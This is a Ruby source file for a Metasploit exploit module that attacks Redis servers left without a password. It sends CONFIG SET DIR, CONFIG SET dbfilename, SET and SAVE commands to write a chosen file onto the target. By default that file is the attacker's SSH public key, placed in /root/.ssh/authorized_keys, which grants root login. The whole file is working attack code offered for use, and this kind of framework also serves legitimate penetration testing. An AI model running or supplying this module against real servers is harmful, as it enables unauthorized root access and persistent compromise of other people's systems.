##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Redis Unauthenticated File Upload',
      'Description'   => %q(
        This module can save data to file in remote redis server,
        Because redis is unprotected without a password set up.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => ['Nixawk'],
      'References'    => [
        ['URL', 'http://antirez.com/news/96'],
        ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
        ['URL', 'http://redis.io/topics/protocol']
      ],
      'Platform'      => %w(unix linux),
      'Targets'       => [['Automatic Target', { }]],
      'Privileged'    => true,
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Nov 11 2015'
      ))
    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(6379),
        OptPath.new('LocalFile', [true, 'Local file to be uploaded', '/root/.ssh/id_rsa.pub']),
        OptString.new('RemoteFile', [true, 'Remote file path', '/root/.ssh/authorized_keys'])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('READ_TIMEOUT', [true, 'Seconds to wait while reading redis responses', 2])
      ], self.class)
  end

  def read_timeout
    datastore['READ_TIMEOUT']
  end

  def redis_proto(parts)
    return if parts.blank?
    command = "*#{parts.length}\r\n"
    parts.each do |p|
      command << "$#{p.length}\r\n#{p}\r\n"
    end
    command
  end

  def send_command(command)
    command = redis_proto(command)
    sock.put(command)
    sock.get_once(-1, read_timeout)
  end

  def send_file(path, content)
    dirname = File.dirname(path)
    basename = File.basename(path)

    key = Rex::Text.rand_text_alpha(32)
    command = ['CONFIG', 'SET', 'DIR', "#{dirname}"]
    data = send_command(command)
    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['CONFIG', 'SET', 'dbfilename', "#{basename}"]
    data = send_command(command)
    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['SET', "#{key}", "#{content}"]
    data = send_command(command)

    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')
    print_good("#{rhost}:#{rport}: save file to #{path}")

    command = ['SAVE']
    data = send_command(command)
    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['DEL', "#{key}"]
    data = send_command(command)
    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')
  end

  def check
    connect
    data = send_command(['INFO'])
    disconnect
    if data && data.include?('redis_mode')
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    begin
      connect
      res = send_command(['PING'])

      if res && res =~ /PONG/
        content = "\n\n#{File.open(datastore['LocalFile']).read}\n\n\n"
        send_file(datastore['RemoteFile'], content)
      end

    rescue ::Exception => e
      print_error("Unable to connect: #{e}")
    ensure
      disconnect
    end
  end
end
